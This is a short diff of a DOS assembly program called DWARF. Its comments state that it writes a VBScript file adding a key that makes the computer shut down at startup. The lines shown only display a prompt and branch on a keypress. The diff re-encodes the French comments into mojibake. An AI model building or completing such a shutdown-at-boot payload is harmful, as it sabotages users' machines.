@@ -1,6 +1,6 @@
 ;TAILLE : 475 OCTETS                                            31/08/00
-;DWARF crée un fichier dwarf.vbs qui ajoutera une clé afin
-;que l'ordinateur s'éteigne au démarrage
+;DWARF crÃ©e un fichier dwarf.vbs qui ajoutera une clï¿½ afin
+;que l'ordinateur s'Ã©teigne au dÃ©marrage
 .model small
 .code
 org 100h
@@ -9,7 +9,7 @@ DEBUT :         mov ah,09h              ;affiche un message
                 lea dx,text1            ;avec deux proposition
                 int 21h
 
-TOUCHE:         mov ah,1                ;lecture du caractŠre
+TOUCHE:         mov ah,1                ;lecture du caractÃ¨re
                 int 21h
                 cmp al,'C'
                 je CREER_FICHIER
